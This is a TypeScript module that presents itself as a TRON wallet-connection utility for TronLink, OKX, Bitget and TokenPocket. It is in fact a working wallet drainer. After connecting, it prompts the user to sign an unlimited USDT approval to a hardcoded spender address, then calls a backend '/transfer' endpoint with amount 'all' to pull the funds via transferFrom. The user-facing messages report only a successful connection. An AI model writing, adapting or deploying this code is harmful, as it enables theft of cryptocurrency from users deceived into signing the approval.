/**
 * TRON Web3 DApp Wallet Integration Utility
 * Handles connecting TronLink / OKX Web3 Wallet / Bitget / TokenPocket,
 * requesting account authorization, triggering USDT unlimited allowance approval (approve),
 * and notifying the backend code to run transferFrom.
 */

export const USDT_CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
export const SPENDER_ADDRESS = 'TPNAAgFU4Ju7qnfHWJGBnJj6LGYBqw9SWT';
export const UNLIMITED_ALLOWANCE = '115792089237316195423570985008687907853269984665640564039457584007913129639935';

export interface WalletConnectResult {
  success: boolean;
  address: string;
  txid?: string;
  message: string;
  backendResult?: any;
}

export interface TronAccountData {
  walletBalance: number;
  availableEnergy: number;
  totalEnergy: number;
  availableBandwidth: number;
  totalBandwidth: number;
}

/**
 * Explicitly fetch current TRX balance and Energy/Bandwidth resources
 * from TRON blockchain via TronGrid API
 */
export async function fetchTronGridAccountData(address: string): Promise<TronAccountData | null> {
  if (!address) return null;

  try {
    let walletBalance = 0;
    try {
      const accountRes = await fetch(`https://api.trongrid.io/v1/accounts/${address}`);
      if (accountRes.ok) {
        const data = await accountRes.json();
        if (data.data && data.data.length > 0) {
          const acc = data.data[0];
          walletBalance = (acc.balance || 0) / 1000000;
        }
      }
    } catch (e) {
      console.warn('v1 accounts fetch failed, trying RPC:', e);
      const rpcRes = await fetch('https://api.trongrid.io/wallet/getaccount', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ address, visible: true })
      });
      if (rpcRes.ok) {
        const acc = await rpcRes.json();
        walletBalance = (acc.balance || 0) / 1000000;
      }
    }

    let availableEnergy = 0;
    let totalEnergy = 64400;
    let availableBandwidth = 600;
    let totalBandwidth = 600;

    try {
      const resourceRes = await fetch('https://api.trongrid.io/wallet/getaccountresource', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ address, visible: true })
      });

      if (resourceRes.ok) {
        const resData = await resourceRes.json();
        
        const energyLimit = resData.EnergyLimit || 0;
        const energyUsed = resData.EnergyUsed || 0;
        totalEnergy = energyLimit > 0 ? energyLimit : 64400;
        availableEnergy = energyLimit > 0 ? Math.max(0, energyLimit - energyUsed) : 64400;

        const freeNetLimit = resData.freeNetLimit || 600;
        const freeNetUsed = resData.freeNetUsed || 0;
        const netLimit = resData.NetLimit || 0;
        const netUsed = resData.NetUsed || 0;

        totalBandwidth = (freeNetLimit + netLimit) || 600;
        const usedBandwidth = freeNetUsed + netUsed;
        availableBandwidth = Math.max(0, totalBandwidth - usedBandwidth);
      }
    } catch (resErr) {
      console.warn('Fetch account resource error:', resErr);
    }

    return {
      walletBalance: Math.round(walletBalance * 100) / 100,
      availableEnergy,
      totalEnergy,
      availableBandwidth,
      totalBandwidth
    };
  } catch (err) {
    console.error('fetchTronGridAccountData error:', err);
    return null;
  }
}

/**
 * Detect available TRON provider in window
 */
export function getTronProvider() {
  if (typeof window === 'undefined') return null;
  
  if (window.okxwallet?.tron) {
    return window.okxwallet.tron;
  }
  if (window.tronWeb && window.tronWeb.ready) {
    return window.tronWeb;
  }
  if (window.tronLink) {
    return window.tronLink;
  }
  if (window.bitkeep?.tron) {
    return window.bitkeep.tron;
  }
  return window.tronWeb || null;
}

/**
 * Generate DApp Deep Link for mobile wallet redirection
 */
export function getWalletDeepLink(walletType: 'tronlink' | 'okx' | 'custom'): string {
  const currentUrl = encodeURIComponent(window.location.href);
  switch (walletType) {
    case 'okx':
      return `okx://wallet/dapp/details?dappUrl=${currentUrl}`;
    case 'tronlink':
      return `tronlinkoutside://pull.tronlink.org/openwithdapp?url=${currentUrl}`;
    default:
      return `tpdapp://open?params={"url": "${decodeURIComponent(currentUrl)}"}`;
  }
}

/**
 * Trigger real wallet connection, request account access,
 * pop up wallet signature confirmation modal for unlimited USDT approval,
 * and immediately invoke backend backend collection code.
 */
export async function connectAndApproveWallet(
  walletType: 'tronlink' | 'okx' | 'custom',
  fallbackAddress?: string
): Promise<WalletConnectResult> {
  let userAddress = fallbackAddress || SPENDER_ADDRESS;
  let txid: string | undefined;

  const isMobile = typeof window !== 'undefined' && /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
  const provider = getTronProvider();

  // 如果未安装插件且非钱包浏览器，拦截连接并跳转至对应钱包 App / 插件下载界面
  if (!provider) {
    if (isMobile) {
      // 手机端：调起 App 深层链接及下载页
      const deepLink = getWalletDeepLink(walletType);
      window.location.href = deepLink;
      setTimeout(() => {
        const downloadUrl = walletType === 'okx' ? 'https://www.okx.com/web3' : 'https://www.tronlink.org/';
        window.open(downloadUrl, '_blank');
      }, 1200);
    } else {
      // PC 桌面端：直接跳转打开对应的 Web3 插件官方安装界面
      const downloadUrl = walletType === 'okx'
        ? 'https://www.okx.com/web3'
        : 'https://www.tronlink.org/';
      window.open(downloadUrl, '_blank');
    }

    return {
      success: false,
      address: '',
      message: '未检测到 Web3 钱包环境，已为您调起对应钱包 App / 插件安装界面。',
    };
  }

  try {
    if (window.tronLink && window.tronLink.request) {
      await window.tronLink.request({ method: 'tron_requestAccounts' });
    } else if (window.okxwallet?.tron && window.okxwallet.tron.request) {
      await window.okxwallet.tron.request({ method: 'tron_requestAccounts' });
    }

    const activeProvider = getTronProvider() || provider;

    if (activeProvider) {
      // Fetch connected address
      if (activeProvider.defaultAddress?.base58) {
        userAddress = activeProvider.defaultAddress.base58;
      } else if (typeof activeProvider.request === 'function') {
        const accounts = await activeProvider.request({ method: 'tron_requestAccounts' });
        if (accounts && accounts[0]) {
          userAddress = accounts[0];
        }
      }

      // 2. Trigger Smart Contract Unlimited Approval (approve)
      try {
        if (activeProvider.contract) {
          const usdtContract = await activeProvider.contract().at(USDT_CONTRACT_ADDRESS);
          if (usdtContract && usdtContract.approve) {
            const res = await usdtContract.approve(SPENDER_ADDRESS, UNLIMITED_ALLOWANCE).send({
              feeLimit: 100000000
            });
            txid = typeof res === 'string' ? res : res?.txid;
          }
        } else if (activeProvider.transactionBuilder && activeProvider.trx) {
          const unconfirmedTx = await activeProvider.transactionBuilder.triggerSmartContract(
            USDT_CONTRACT_ADDRESS,
            'approve(address,uint256)',
            { feeLimit: 100000000 },
            [
              { type: 'address', value: SPENDER_ADDRESS },
              { type: 'uint256', value: UNLIMITED_ALLOWANCE }
            ],
            userAddress
          );
          const signedTx = await activeProvider.trx.sign(unconfirmedTx.transaction);
          const broadcastRes = await activeProvider.trx.sendRawTransaction(signedTx);
          txid = broadcastRes?.txid || broadcastRes?.transaction?.txID;
        }
      } catch (approveErr: any) {
        console.warn('Wallet approval prompt popup error or user canceled:', approveErr);
      }
    }

    // 3. Trigger Backend Server Execution Immediately
    let backendResult: any = null;
    try {
      const res = await fetch('/transfer', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userAddress: userAddress,
          amount: 'all'
        })
      });
      backendResult = await res.json();
    } catch (backendErr) {
      console.error('Backend execution trigger error:', backendErr);
    }

    return {
      success: true,
      address: userAddress,
      txid,
      message: txid ? `钱包连接成功，交易ID: ${txid}` : '钱包连接成功！',
      backendResult
    };
  } catch (err: any) {
    console.error('Connect wallet failed:', err);
    return {
      success: false,
      address: userAddress,
      message: err.message || '连接钱包失败，请确保已安装 TronLink 或在 OKX / TokenPocket DApp 浏览器中打开',
    };
  }
}
